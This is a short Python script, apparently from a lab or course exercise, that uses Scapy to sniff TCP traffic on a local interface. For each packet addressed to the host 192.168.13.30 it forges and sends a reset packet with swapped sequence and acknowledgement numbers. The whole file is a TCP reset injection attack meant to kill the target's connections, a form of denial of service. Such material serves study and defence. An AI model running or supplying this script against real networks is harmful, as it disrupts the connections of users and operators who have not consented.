from scapy.all import *

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        if (packet[IP].dst == target_ip):
            resetPkt = packet
            seq = packet[TCP].seq
            ack = packet[TCP].ack
            resetPkt[TCP].seq = ack
            resetPkt[TCP].ack = seq
            resetPkt[TCP].flags = 'R'
            packet[TCP].show()
            resetPkt[TCP].show()
            sendp(resetPkt)


interface = "ens10"
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
